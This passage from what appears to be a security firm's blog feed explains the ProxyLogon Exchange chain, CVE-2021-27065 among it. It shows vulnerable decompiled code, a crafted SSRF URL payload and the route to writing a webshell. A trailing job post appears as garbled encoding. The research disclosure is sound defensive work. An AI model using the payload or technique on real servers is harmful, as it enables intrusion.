            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scheme&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UriSchemeHttps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fqdn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AnchoredRoutingTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E15MinVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ProxyToDownLevel&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;RequestDetailsLoggerBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestDetailsLogger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SafeAppendGenericInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ProxyToDownLevel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientUrlForProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;LogElapsedTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;L_TargetBEUrl&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the code snippet, you can see the property &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BackEndServer.Fqdn&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AnchoredRoutingTarget&lt;/code&gt; is assigned from the cookie directly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;HttpProxy\OwaResourceProxyRequestHandler.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AnchorMailbox&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ResolveAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;HttpCookie&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClientRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-AnonResource-Backend&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsNullOrEmpty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;X-AnonResource-Backend-Cookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[OwaResourceProxyRequestHandler::ResolveAnchorMailbox]: AnonResourceBackend cookie used: {0}; context {1}.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ServerInfoAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BackEndServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;savedBackendServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;AnonymousAnchorMailbox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Though we can only control the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; part of the URL, but hang on, isn‚Äôt &lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt;manipulating a URL Parser&lt;/a&gt; exactly what I am good at? Exchange builds the Backend URL by built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UriBuilder&lt;/code&gt;. However, since C# didn‚Äôt verify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt;, so we can enclose the whole URL with some special characters to access arbitrary servers and ports.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;https://[foo]@example.com:443/path#]:444/owa/auth/x.js&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So far we have a super SSRF that can control almost all the HTTP requests and get all the replies. The most impressive thing is that the Frontend of Exchange will generate a Kerberos Ticket for us, which means even when we are attacking a protected and domain-joined HTTP service, we can still hack with the authentication of Exchange Machine Account.&lt;/p&gt;

&lt;p&gt;So, what is the root cause of this arbitrary Backend assignment? As mentioned, the Exchange Server changes its architecture while releasing new versions. It might have different functions in different versions even with the same component under the same name. Microsoft has put great effort into ensuring the architectural capability between new and old versions. This cookie is a quick solution and the design debt of Exchange making the Frontend in the new architecture could identify where the old Backend is.&lt;/p&gt;

&lt;h2 id=&quot;cve-2021-27065---post-auth-arbitrary-file-write&quot;&gt;CVE-2021-27065 - Post-auth Arbitrary-File-Write&lt;/h2&gt;

&lt;p&gt;Thanks to the super SSRF allowing us to access the Backend without restriction. The next is to find a RCE bug to chain together. Here we leverage a Backend internal API &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proxyLogon.ecp&lt;/code&gt; to become the admin. The API is also the reason why we called it ProxyLogon.&lt;/p&gt;

&lt;p&gt;Because we leverage the Frontend handler of static resources to access the ECExchange Control Panel (ECP) Backend, the header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msExchLogonMailbox&lt;/code&gt;, which is a special HTTP header in the ECP Backend, will not be blocked by the Frontend. By leveraging this minor inconsistency, we can specify ourselves as the SYSTEM user and generate a valid ECP session with the internal API.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With the inconsistency between the Frontend and Backend, we can access all the functions on ECP by Header forgery and internal Backend API abuse. Next, we have to find an RCE bug on the ECP interface to chain them together. The ECP wraps the Exchange PowerShell commands as an abstract interface by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ecp/DDI/DDIService.svc&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DDIService&lt;/code&gt; defines several PowerShell executing pipelines by XAML so that it can be accessed by Web. While verifying the DDI implementation, we found the tag of WriteFileActivity did not check the file path properly and led to an arbitrary-file-write.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DDIService\WriteFileActivity.cs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-cs highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RunResult&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DataRow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataTable&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DataObjectStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codeBehind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Workflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UpdateTableDelegate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;updateTableDelegate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;DataRow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataRow&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Rows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OutputFileNameVariable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;RunResult&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RunResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ErrorOccur&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StreamWriter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;streamWriter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;StreamWriter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FileMode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CreateNew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;streamWriter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WriteLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;runResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ErrorOccur&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are several paths to trigger the vulnerability of arbitrary-file-write. Here we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResetOABVirtualDirectory.xaml&lt;/code&gt; as an example and write the result of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Set-OABVirtualDirectory&lt;/code&gt; to the webroot to be our Webshell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we have a working pre-auth RCE exploit chain. An unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an exposed 443 port. Here is an &lt;a href=&quot;https://www.youtube.com/watch?v=SvjGMo9aMwE&quot;&gt;demonstration video&lt;/a&gt;:&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/SvjGMo9aMwE&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;

&lt;p&gt;As the first blog of this series, ProxyLogon perfectly shows how severe this attack surface could be. We will have more examples to come. Stay tuned!&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/</link>
                <guid>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon</guid>
                <pubDate>Fri, 06 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[Â∑≤ÁµêÊùü] DEVCORE ÂæµÊ±ÇÁ¥ÖÈöäÊºîÁ∑¥Â∑•Á®ãÂ∏´</title>
                <description>&lt;p&gt;Êà¥Â§´ÂØáÁàæÂ∑≤ÊàêÁ´ãËøë‰πùÂπ¥ÔºåÈÅéÂéªÊàëÂÄë‰∏çÊñ∑Âú∞ÈëΩÁ†îÈÄ≤ÈöéÊîªÊìäÊäÄÂ∑ßÔºåÁÇ∫Ë®±Â§öÂÆ¢Êà∂Êèê‰æõÈ´òÂìÅË≥™ÁöÑÊª≤ÈÄèÊ∏¨Ë©¶ÊúçÂãôÔºå‰πüÊàêÁÇ∫ÂÆ¢Êà∂ÊúÄ‰ø°Ë≥¥ÁöÑË≥áÂÆâ‰ºô‰º¥‰πã‰∏Ä„ÄÇÂú® 2017 Âπ¥ÊàëÂÄëÊõ¥ÊàêÁÇ∫Á¨¨‰∏ÄÂÄãÂú®Âè∞ÁÅ£Êé®Âá∫Á¥ÖÈöäÊºîÁ∑¥ÊúçÂãôÁöÑÊú¨ÂúüÂª†ÂïÜÔºåÈÄèÈÅéÁÑ°ÊâÄ‰∏çÁî®ÂÖ∂Ê•µÁöÑÈß≠ÂÆ¢ÊÄùÁ∂≠ÔºåÈô∏Á∫åÁÇ∫ÈõªÂ≠êÂïÜÂãô„ÄÅÊîøÂ∫úÈÉ®ÈñÄ„ÄÅÈáëËûçÊ•≠ËÄÖÂü∑Ë°åÊúÄÁúüÂØ¶‰∏îÂÖ®Èù¢ÁöÑÊîªÊìäÊºîÁ∑¥ÔºåÂêåÊôÇ‰πüÁ¥ØÁ©ç‰∫ÜË±êÂØåÁöÑÁ∂ìÈ©óËàáÊ°à‰æãÔºåÊàêÁÇ∫Âè∞ÁÅ£Á¥ÖÈöäÊºîÁ∑¥ÂØ¶ÂäõÊúÄÊ∑±ÂéöÁöÑÊúçÂãô‰æõÊáâÂïÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;Èö®ËëóÂÖ¨Âè∏Ë¶èÊ®°Êì¥Â§ßÔºåÊàëÂÄëÈ¶ñÂ∫¶ÂÖ¨ÈñãÊãõÂãüÁ¥ÖÈöäÊºîÁ∑¥‰∫∫ÊâçÔºåÂ∏åÊúõËÉΩÂ§†ÊâæÂà∞‰∏ÄËá≥ÂÖ©‰Ωç Support Á¥ÖÈöäÊºîÁ∑¥Â∑•Á®ãÂ∏´ÔºåÊì¥Â§ßÊàëÂÄëÁöÑÂæåÂã§ËÉΩÈáèÔºåÈûèÂõ∫Êà¥Â§´ÂØáÁàæÁöÑÂúòÈöä‰ΩúÊà∞ËÉΩÂäõÔºåËÆìÊàëÂÄëÊåÅÁ∫åÁÇ∫‰ºÅÊ•≠Êèê‰æõÊúÄÂÑ™Áï∞ÁöÑË≥áÂÆâÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈùûÂ∏∏Ê∏¥ÊúõÊÇ®ÁöÑÂä†ÂÖ•ÔºåËã•ÊÇ®ÊúâÊÑèÊàêÁÇ∫Êà¥Â§´ÂØáÁàæÁöÑ‰∏ÄÂì°ÔºåÂèØÂèÉËÄÉ‰∏ãÂàóËÅ∑Áº∫Á¥∞ÁØÄÔºö&lt;/p&gt;

&lt;!-- more --&gt;

